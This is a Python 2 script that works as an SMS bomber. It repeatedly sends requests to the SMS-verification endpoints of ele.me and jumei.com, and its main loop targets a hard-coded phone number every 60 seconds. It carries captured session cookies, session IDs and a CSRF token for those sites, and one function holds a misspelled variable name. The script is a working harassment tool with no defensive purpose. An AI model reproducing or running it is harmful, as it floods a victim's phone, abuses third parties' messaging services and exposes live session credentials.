#!usr/bin/env python
#coding=utf-8
# 
import sys
import os
reload(sys)   
sys.setdefaultencoding('utf8')  
import re
import urllib2
import base64
import time
import StringIO
import random
import cStringIO
import pycurl
import urllib
import sqlite3
import socket
from Request  import curl_request
import time


def bomb_eleme(number):
	host = 'v5.ele.me'
	url_para='/terminalCode/sendMCBCode'
	cookie ='source__ele_me=seo_keyword_with_eleme; fixed_cid=0c358e589eae2b7670b646f36f750a67; temp_cid=e81f3917c148fb9c250152d014afb72f; track_id=1412423608%7Cf422aefcb376758e513ddf439af1408e58e9ff41f0eab6e60ee5c0880def59fd%7C96abd9b5df57a52dbe4bcfb20a342ff1; eleme__ele_me=fc3c4de37fc9473fc28ae0881e47af2e:f6d0794dc0d401e44bb57b30a29dd0be0c6acb84; sfRemember__ele_me=e0cec85eafb500d671fd096d6b224f55; SID=B2VkZklJNMsABJrY5R8zQTXI4oomw89iiauw; user_id__ele_me=2777741; __utma=1.1210531747.1412423619.1412423619.1412423619.1; __utmb=1.14.6.1412423701614; __utmc=1; __utmz=1.1412423619.1.1.utmcsr=v5.ele.me|utmccn=(referral)|utmcmd=referral|utmcct=/; _ga=GA1.2.428678646.1412423608; Hm_lvt_4f06ea17a2c10a25b2f39bb33b432b16=1412423608; Hm_lpvt_4f06ea17a2c10a25b2f39bb33b432b16=1412423731'
	post_para = 'type=sms&phone=15710029792&csrf_token=9e402c3950d448808e2414c4519c2e737ff5792e'

	while 1:
		url_handle = curl_request(host,verbose=1)
		url_handle.set_url_para(url_para)
		url_handle.set_cookie(cookie)
		url_handle.set_post()
		url_handle.set_post_para(post_para)
		re = url_handle.perform()
		if re>0:
			break

	res_str = url_handl.get_body()
	print res_str

def bomb_by_jumei(number):
	host = 'passport.jumei.com'
	url_para = '/i/account/ajax_send_sms_for_mobile_register?mobile=%s' % number	
	cookie = 'default_site_25=bj; first_visit=1; PHPSESSID=vrhfnk1s1g0cf0g8t844e34911; abt88=new; abt89=new; abt82=normal; cookie_uid=RPUHPVHPeV8KE6BI477w; search_start_time=1412059006264; referer_site=baidu_sem_sc_ty_zc; etc_n=true; abt52=new; abt62=old; Hm_lvt_884477732c15fb2f2416fb892282394b=1412058974; Hm_lpvt_884477732c15fb2f2416fb892282394b=1412059007; __utma=1.807210483.1412058975.1412058975.1412058975.1; __utmb=1.2.10.1412058975; __utmc=1; __utmz=1.1412058975.1.1.utmcsr=baidu_sem|utmccn=(not%20set)|utmcmd=(not%20set); _adwe=151581930%23http%253A%252F%252Fbj.jumei.com%252F%253Fetc_k%253D10396736027%2526etc_m%253Dbaidu%2526etc_n%253Dsem%2526etc_s%253Dsemwinner%2526etc_t%253D2691398203%2526etc_x%253D20463%2526referer%253Dbaidu_sem_sc_ty_zc%2526utm_source%253Dbaidu_sem; _adwb=93825820; _adwc=151581930; _adwp=151581930.3674286858.1412058974.1412058974.1412058974.1; _adwr=151581930%23http%253A%252F%252Fbj.jumei.com%252F%253Fetc_k%253D10396736027%2526etc_m%253Dbaidu%2526etc_n%253Dsem%2526etc_s%253Dsemwinner%2526etc_t%253D2691398203%2526etc_x%253D20463%2526referer%253Dbaidu_sem_sc_ty_zc%2526utm_source%253Dbaidu_sem; search_user_status=0; newuser0424=0; local_city=%7B%22site%22%3A%22bj%22%2C%22city%22%3A%22beijing%22%7D; SERVERID=1' 
	header=['Content-Type: application/x-www-form-urlencoded','X-Requested-With: XMLHttpRequest']
	while 1:
		url_handle = curl_request(host,verbose=1)
		url_handle.set_header(header)
		url_handle.set_cookie(cookie)
		url_handle.set_url_para(url_para)
		re = url_handle.perform()
		if re >0 :
			break

	res_str = url_handle.get_body()
	print res_str

def bomb_all(number,host,url_para,cookie,post_para=None,header=None):
	while 1:
		url_handle = curl_request(host,verbose=1)
		url_handle.set_url_para(url_para)
		url_handle.set_cookie(cookie)
		if header != None:
			url_handle.set_header(header)
		if post_para != None:
			url_handle.set_post()
			url_handle.set_post_para(post_para)
		re = url_handle.perform()
		if re >0:
			break
	res_str = url_handle.get_body()
	print res_str
		
if __name__ == '__main__':
	number = '15710029792'
	host = 'passport.jumei.com'
	url_para = '/i/account/ajax_send_sms_for_mobile_register?mobile=%s' % number	
	cookie = 'default_site_25=bj; first_visit=1; PHPSESSID=vrhfnk1s1g0cf0g8t844e34911; abt88=new; abt89=new; abt82=normal; cookie_uid=RPUHPVHPeV8KE6BI477w; search_start_time=1412059006264; referer_site=baidu_sem_sc_ty_zc; etc_n=true; abt52=new; abt62=old; Hm_lvt_884477732c15fb2f2416fb892282394b=1412058974; Hm_lpvt_884477732c15fb2f2416fb892282394b=1412059007; __utma=1.807210483.1412058975.1412058975.1412058975.1; __utmb=1.2.10.1412058975; __utmc=1; __utmz=1.1412058975.1.1.utmcsr=baidu_sem|utmccn=(not%20set)|utmcmd=(not%20set); _adwe=151581930%23http%253A%252F%252Fbj.jumei.com%252F%253Fetc_k%253D10396736027%2526etc_m%253Dbaidu%2526etc_n%253Dsem%2526etc_s%253Dsemwinner%2526etc_t%253D2691398203%2526etc_x%253D20463%2526referer%253Dbaidu_sem_sc_ty_zc%2526utm_source%253Dbaidu_sem; _adwb=93825820; _adwc=151581930; _adwp=151581930.3674286858.1412058974.1412058974.1412058974.1; _adwr=151581930%23http%253A%252F%252Fbj.jumei.com%252F%253Fetc_k%253D10396736027%2526etc_m%253Dbaidu%2526etc_n%253Dsem%2526etc_s%253Dsemwinner%2526etc_t%253D2691398203%2526etc_x%253D20463%2526referer%253Dbaidu_sem_sc_ty_zc%2526utm_source%253Dbaidu_sem; search_user_status=0; newuser0424=0; local_city=%7B%22site%22%3A%22bj%22%2C%22city%22%3A%22beijing%22%7D; SERVERID=1' 
	header=['Content-Type: application/x-www-form-urlencoded','X-Requested-With: XMLHttpRequest']
#	bomb_all(number,host,url_para,cookie,header= header)
#	bomb_by_jumei(number)
	host = 'v5.ele.me'
	url_para='/terminalCode/sendMCBCode'
	cookie ='source__ele_me=seo_keyword_with_eleme; fixed_cid=0c358e589eae2b7670b646f36f750a67; temp_cid=e81f3917c148fb9c250152d014afb72f; track_id=1412423608%7Cf422aefcb376758e513ddf439af1408e58e9ff41f0eab6e60ee5c0880def59fd%7C96abd9b5df57a52dbe4bcfb20a342ff1; eleme__ele_me=fc3c4de37fc9473fc28ae0881e47af2e:f6d0794dc0d401e44bb57b30a29dd0be0c6acb84; sfRemember__ele_me=e0cec85eafb500d671fd096d6b224f55; SID=B2VkZklJNMsABJrY5R8zQTXI4oomw89iiauw; user_id__ele_me=2777741; __utma=1.1210531747.1412423619.1412423619.1412423619.1; __utmb=1.14.6.1412423701614; __utmc=1; __utmz=1.1412423619.1.1.utmcsr=v5.ele.me|utmccn=(referral)|utmcmd=referral|utmcct=/; _ga=GA1.2.428678646.1412423608; Hm_lvt_4f06ea17a2c10a25b2f39bb33b432b16=1412423608; Hm_lpvt_4f06ea17a2c10a25b2f39bb33b432b16=1412423731'
	post_para = 'type=sms&phone=%s&csrf_token=9e402c3950d448808e2414c4519c2e737ff5792e' % number
	while 1:
		
		bomb_all(number,host,url_para,cookie,post_para=post_para)
		time.sleep(60)

